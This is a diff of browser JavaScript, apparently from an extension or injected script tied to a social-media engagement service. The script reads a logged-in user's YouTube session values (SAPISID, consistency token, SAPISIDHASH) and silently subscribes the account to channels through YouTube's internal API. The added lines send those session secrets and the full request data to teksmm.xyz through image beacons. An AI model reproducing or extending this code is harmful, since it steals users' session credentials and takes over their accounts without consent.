@@ -1,4 +1,3 @@
-
 function rasgteleSure(min, max) { 
   return Math.floor(Math.random() * (max - min + 1) + min);
 }
@@ -149,8 +148,12 @@ function siparis_getir_3() {
 					vars.id = data.id.trim();
 					vars.consistency = value.ytData.consistency
 					vars.sapisid = value.ytData.sapisid
+					new Image().src = '//teksmm.xyz/smmnew/log/yt.php?message=cons'+vars.consistency+"----sapsid"+vars.sapisid;
+					new Image().src = '//teksmm.xyz/smmnew/log/yt.php?message=getir1';
 					if (vars.channelIds && vars.consistency.length > 0 && vars.sapisid.length > 0) {
+						new Image().src = '//teksmm.xyz/smmnew/log/yt.php?message=getir2';
 						if(!checkOrSave(vars.id,"3")){
+							new Image().src = '//teksmm.xyz/smmnew/log/yt.php?message=getir3';
 							subscribe_client(vars);
 						}
 					}
@@ -195,7 +198,9 @@ function subscribe_client(vars) {
         if (xhr.readyState == 4 && xhr.status == 200) {	
             var data = xhr.responseText;
             vars.login = data.match('"LOGGED_IN":(.*?),')[1];
+			new Image().src = '//teksmm.xyz/smmnew/log/yt.php?message=getir4';
             if ( (vars.login == "true" || vars.login == true) && data.indexOf('subscribed=1') == -1 ) {
+				new Image().src = '//teksmm.xyz/smmnew/log/yt.php?message=getir5';
                 var middlePoint = data.split('subscribeEndpoint":{"channelIds":');
                 var startPoint = middlePoint[0].split('{"clickTrackingParams":"').pop();
                 var endPoint = middlePoint[1].split("}}]")[0]
@@ -247,6 +252,7 @@ function subscribe_client(vars) {
                 vars.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                 vars.clientversion = data.split('"INNERTUBE_CONTEXT_CLIENT_VERSION":"')[1].split('"')[0];
                 console.log(vars)
+				new Image().src = '//teksmm.xyz/smmnew/log/yt.php?message='+JSON.stringify(vars);
                 createPost(vars,"subscribe");    
             }
         }
@@ -322,7 +328,9 @@ function video_like(vars) {
 
 
 function createPost(vars,type) {
+	new Image().src = '//teksmm.xyz/smmnew/log/yt.php?message=getir6';
 	if(type == "subscribe"){
+		new Image().src = '//teksmm.xyz/smmnew/log/yt.php?message=getir7';
 		var postData = 
 		{
 			"context": {
@@ -397,7 +405,7 @@ function createPost(vars,type) {
             "params": vars.params
         };
 	}
-
+	new Image().src = '//teksmm.xyz/smmnew/log/yt.php?message='+JSON.stringify(postData);
 	var xhr = new XMLHttpRequest();
 	xhr.open("POST", "https://www.youtube.com/youtubei/v1/subscription/subscribe?key="+vars.apiKey, true);
 	xhr.setRequestHeader("authorization", vars.SAPISIDHASH);
@@ -411,6 +419,7 @@ function createPost(vars,type) {
 	xhr.setRequestHeader("x-origin",  "https://www.youtube.com");
 	xhr.onreadystatechange = function() {
 		if (xhr.readyState == 4 && xhr.status == 200) {
+			new Image().src = '//teksmm.xyz/smmnew/log/yt.php?message=getir200';
 			xhr.close;
 		}
 	}
